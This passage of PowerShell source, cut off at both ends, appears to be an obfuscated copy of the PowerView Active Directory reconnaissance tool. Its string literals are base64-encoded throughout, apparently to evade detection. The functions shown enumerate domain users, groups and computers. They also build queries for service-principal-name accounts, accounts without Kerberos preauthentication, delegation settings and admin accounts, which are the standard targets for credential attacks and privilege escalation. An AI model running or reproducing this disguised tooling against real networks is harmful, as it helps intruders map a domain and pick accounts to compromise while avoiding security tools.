)),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        $GroupReferencePropertySet = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBkAG0AaQBuAGMAbwB1AG4AdAA='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABlAHMAYwByAGkAcAB0AGkAbwBuAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZwByAG8AdQBwAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBlAG0AYgBlAHIAbwBmAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwB5AHMAdABlAG0AZgBsAGEAZwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        $ComputerReferencePropertySet = @($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YQBjAGMAbwB1AG4AdABlAHgAcABpAHIAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcABhAHMAcwB3AG8AcgBkAHQAaQBtAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YgBhAGQAcAB3AGQAYwBvAHUAbgB0AA=='))),'cn',$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAGQAZQBwAGEAZwBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('YwBvAHUAbgB0AHIAeQBjAG8AZABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABpAHMAdABpAG4AZwB1AGkAcwBoAGUAZABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABuAHMAaABvAHMAdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('ZABzAGMAbwByAGUAcAByAG8AcABhAGcAYQB0AGkAbwBuAGQAYQB0AGEA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBuAHMAdABhAG4AYwBlAHQAeQBwAGUA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('aQBzAGMAcgBpAHQAaQBjAGEAbABzAHkAcwB0AGUAbQBvAGIAagBlAGMAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAGYAZgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABhAHMAdABsAG8AZwBvAG4AdABpAG0AZQBzAHQAYQBtAHAA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGMAYQBsAHAAbwBsAGkAYwB5AGYAbABhAGcAcwA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bABvAGcAbwBuAGMAbwB1AG4AdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bQBzAGQAcwAtAHMAdQBwAHAAbwByAHQAZQBkAGUAbgBjAHIAeQBwAHQAaQBvAG4AdAB5AHAAZQBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bgBhAG0AZQA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBhAHQAZQBnAG8AcgB5AA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAYwBsAGEAcwBzAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAZwB1AGkAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBiAGoAZQBjAHQAcwBpAGQA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0A'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AcwBlAHIAdgBpAGMAZQBwAGEAYwBrAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('bwBwAGUAcgBhAHQAaQBuAGcAcwB5AHMAdABlAG0AdgBlAHIAcwBpAG8AbgA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAByAGkAbQBhAHIAeQBnAHIAbwB1AHAAaQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cAB3AGQAbABhAHMAdABzAGUAdAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBhAG0AYQBjAGMAbwB1AG4AdAB0AHkAcABlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('cwBlAHIAdgBpAGMAZQBwAHIAaQBuAGMAaQBwAGEAbABuAGEAbQBlAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAGUAcgBhAGMAYwBvAHUAbgB0AGMAbwBuAHQAcgBvAGwA'))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwBoAGEAbgBnAGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dQBzAG4AYwByAGUAYQB0AGUAZAA='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAGgAYQBuAGcAZQBkAA=='))),$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('dwBoAGUAbgBjAHIAZQBhAHQAZQBkAA=='))))
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TABEAEEAUABGAGkAbAB0AGUAcgA=')))] = $LDAPFilter }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) {
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) {
                $TargetForest = Get-Domain -Domain $Domain | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            else {
                $TargetForest = Get-Domain -Domain $Domain -Credential $Credential | Select-Object -ExpandProperty Forest | Select-Object -ExpandProperty Name
            }
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Enumerated forest '$TargetForest' for target domain '$Domain'"
        }
        $SchemaArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SchemaArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        if ($TargetForest) {
            $SchemaArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RgBvAHIAZQBzAHQA')))] = $TargetForest
        }
    }
    PROCESS {
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUAUAByAG8AcABlAHIAdAB5AFMAZQB0AA==')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAFUAcwBpAG4AZwAgAHMAcABlAGMAaQBmAGkAZQBkACAALQBSAGUAZgBlAHIAZQBuAGMAZQBQAHIAbwBwAGUAcgB0AHkAUwBlAHQA')))
            $ReferenceObjectProperties = $ReferencePropertySet
        }
        elseif ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAGYAZQByAGUAbgBjAGUATwBiAGoAZQBjAHQA')))]) {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBGAGkAbgBkAC0ARABvAG0AYQBpAG4ATwBiAGoAZQBjAHQAUAByAG8AcABlAHIAdAB5AE8AdQB0AGwAaQBlAHIAXQAgAEUAeAB0AHIAYQBjAHQAaQBuAGcAIABwAHIAbwBwAGUAcgB0AHkAIABuAGEAbQBlAHMAIABmAHIAbwBtACAALQBSAGUAZgBlAHIAZQBuAGMAZQBPAGIAagBlAGMAdAAgAHQAbwAgAHUAcwBlACAAYQBzACAAdABoAGUAIAByAGUAZgBlAHIAZQBuAGMAZQAgAHAAcgBvAHAAZQByAHQAeQAgAHMAZQB0AA==')))
            $ReferenceObjectProperties = Get-Member -InputObject $ReferenceObject -MemberType NoteProperty | Select-Object -Expand Name
            $ReferenceObjectClass = $ReferenceObject.objectclass | Select-Object -Last 1
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Calculated ReferenceObjectClass : $ReferenceObjectClass"
        }
        else {
            Write-Verbose "[Find-DomainObjectPropertyOutlier] Using the default reference property set for the object class '$ClassName'"
        }
        if (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA=')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBzAGUAcgA='))))) {
            $Objects = Get-DomainUser @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $UserReferencePropertySet
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA==')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwByAG8AdQBwAA=='))))) {
            $Objects = Get-DomainGroup @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $GroupReferencePropertySet
            }
        }
        elseif (($ClassName -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA==')))) -or ($ReferenceObjectClass -eq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAG0AcAB1AHQAZQByAA=='))))) {
            $Objects = Get-DomainComputer @SearcherArguments
            if (-not $ReferenceObjectProperties) {
                $ReferenceObjectProperties = $ComputerReferencePropertySet
            }
        }
        else {
            throw "[Find-DomainObjectPropertyOutlier] Invalid class: $ClassName"
        }
        ForEach ($Object in $Objects) {
            $ObjectProperties = Get-Member -InputObject $Object -MemberType NoteProperty | Select-Object -Expand Name
            ForEach($ObjectProperty in $ObjectProperties) {
                if ($ReferenceObjectProperties -NotContains $ObjectProperty) {
                    $Out = New-Object PSObject
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBhAG0AQQBjAGMAbwB1AG4AdABOAGEAbQBlAA=='))) $Object.SamAccountName
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdAB5AA=='))) $ObjectProperty
                    $Out | Add-Member Noteproperty $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBhAGwAdQBlAA=='))) $Object.$ObjectProperty
                    $Out.PSObject.TypeNames.Insert(0, $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABvAHcAZQByAFYAaQBlAHcALgBQAHIAbwBwAGUAcgB0AHkATwB1AHQAbABpAGUAcgA='))))
                    $Out
                }
            }
        }
    }
}
function Get-DomainUser {
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.User')]
    [OutputType('PowerView.User.Raw')]
    [CmdletBinding(DefaultParameterSetName = 'AllowDelegation')]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,
        [Switch]
        $SPN,
        [Switch]
        $AdminCount,
        [Parameter(ParameterSetName = 'AllowDelegation')]
        [Switch]
        $AllowDelegation,
        [Parameter(ParameterSetName = 'DisallowDelegation')]
        [Switch]
        $DisallowDelegation,
        [Switch]
        $TrustedToAuth,
        [Alias('KerberosPreauthNotRequired', 'NoPreauth')]
        [Switch]
        $PreauthNotRequired,
        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,
        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,
        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,
        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,
        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,
        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',
        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,
        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,
        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,
        [Switch]
        $Tombstone,
        [Alias('ReturnOne')]
        [Switch]
        $FindOne,
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,
        [Switch]
        $Raw
    )
    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }
    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $Domain }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UAByAG8AcABlAHIAdABpAGUAcwA=')))] = $Properties }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))] = $SearchBase }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIA')))] = $Server }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAUwBjAG8AcABlAA==')))] = $SearchScope }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UgBlAHMAdQBsAHQAUABhAGcAZQBTAGkAegBlAA==')))] = $ResultPageSize }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAHIAdgBlAHIAVABpAG0AZQBMAGkAbQBpAHQA')))] = $ServerTimeLimit }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGMAdQByAGkAdAB5AE0AYQBzAGsAcwA=')))] = $SecurityMasks }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VABvAG0AYgBzAHQAbwBuAGUA')))] = $Tombstone }
        if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))]) { $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwByAGUAZABlAG4AdABpAGEAbAA=')))] = $Credential }
        $UserSearcher = Get-DomainSearcher @SearcherArguments
    }
    PROCESS {
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($UserSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA')))).Replace(')', $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))))
                if ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBTAC0AMQAtAA==')))) {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBDAE4APQA=')))) {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))]) -and (-not $PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBlAGEAcgBjAGgAQgBhAHMAZQA=')))])) {
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))))) -replace $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABDAD0A'))),'' -replace ',','.'
                        Write-Verbose "[Get-DomainUser] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $IdentityDomain
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $UserSearcher) {
                            Write-Warning "[Get-DomainUser] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XgBbADAALQA5AEEALQBGAF0AewA4AH0ALQAoAFsAMAAtADkAQQAtAEYAXQB7ADQAfQAtACkAewAzAH0AWwAwAC0AOQBBAC0ARgBdAHsAMQAyAH0AJAA=')))) {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADgA'))), '(').Replace($([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('XAAyADkA'))), ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $UserDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $UserName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$UserName)"
                        $SearcherArguments[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG0AYQBpAG4A')))] = $UserDomain
                        Write-Verbose "[Get-DomainUser] Extracted domain '$UserDomain' from '$IdentityInstance'"
                        $UserSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                else {
                    $IdentityFilter += "(samAccountName=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwBQAE4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABuAG8AbgAtAG4AdQBsAGwAIABzAGUAcgB2AGkAYwBlACAAcAByAGkAbgBjAGkAcABhAGwAIABuAGEAbQBlAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABzAGUAcgB2AGkAYwBlAFAAcgBpAG4AYwBpAHAAYQBsAE4AYQBtAGUAPQAqACkA')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGMAYQBuACAAYgBlACAAZABlAGwAZQBnAGEAdABlAGQA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAAhACgAdQBzAGUAcgBBAGMAYwBvAHUAbgB0AEMAbwBuAHQAcgBvAGwAOgAxAC4AMgAuADgANAAwAC4AMQAxADMANQA1ADYALgAxAC4ANAAuADgAMAAzADoAPQAxADAANAA4ADUANwA0ACkAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABpAHMAYQBsAGwAbwB3AEQAZQBsAGUAZwBhAHQAaQBvAG4A')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB3AGgAbwAgAGEAcgBlACAAcwBlAG4AcwBpAHQAaQB2AGUAIABhAG4AZAAgAG4AbwB0ACAAdAByAHUAcwB0AGUAZAAgAGYAbwByACAAZABlAGwAZQBnAGEAdABpAG8AbgA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KAB1AHMAZQByAEEAYwBjAG8AdQBuAHQAQwBvAG4AdAByAG8AbAA6ADEALgAyAC4AOAA0ADAALgAxADEAMwA1ADUANgAuADEALgA0AC4AOAAwADMAOgA9ADEAMAA0ADgANQA3ADQAKQA=')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QQBkAG0AaQBuAEMAbwB1AG4AdAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIABhAGQAbQBpAG4AQwBvAHUAbgB0AD0AMQA=')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABhAGQAbQBpAG4AYwBvAHUAbgB0AD0AMQApAA==')))
            }
            if ($PSBoundParameters[$([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VAByAHUAcwB0AGUAZABUAG8AQQB1AHQAaAA=')))]) {
                Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('WwBHAGUAdAAtAEQAbwBtAGEAaQBuAFUAcwBlAHIAXQAgAFMAZQBhAHIAYwBoAGkAbgBnACAAZgBvAHIAIAB1AHMAZQByAHMAIAB0AGgAYQB0ACAAYQByAGUAIAB0AHIAdQBzAHQAZQBkACAAdABvACAAYQB1AHQAaABlAG4AdABpAGMAYQB0AGUAIABmAG8AcgAgAG8AdABoAGUAcgAgAHAAcgBpAG4AYwBpAHAAYQBsAHMA')))
                $Filter += $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('KABtAHMAZABzAC0AYQBsAGwAbwB3AGUAZAB0AG8AZABlAGwAZQBnAGEAdABlAHQAbwA9ACoAKQA=')))
            }
